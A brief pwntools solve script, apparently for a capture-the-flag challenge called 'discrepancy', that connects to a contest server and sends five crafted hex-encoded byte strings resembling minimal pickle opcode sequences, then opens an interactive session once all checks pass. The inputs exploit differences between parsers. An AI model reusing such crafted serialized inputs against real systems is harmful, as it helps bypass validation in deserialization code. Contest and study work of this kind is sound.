from pwn import *

solve1 = "28882e"       # b'(\x88.'
solve2 = "8828652e"     # b'\x88(e.'
solve3 = "4620350a2e"   # b'F 5\n.'
solve4 = "282e"         # b'(.'
solve5 = "4931000a2e"   # b'I1\x00\n.'

p = remote('discrepancy.chals.sekai.team', 1337, ssl=True)
p.sendline(solve1.encode())
p.sendline(solve2.encode())
p.sendline(solve3.encode())
p.sendline(solve4.encode())
p.sendline(solve5.encode())
p.recvuntil(b'All checks passed\n')

p.interactive()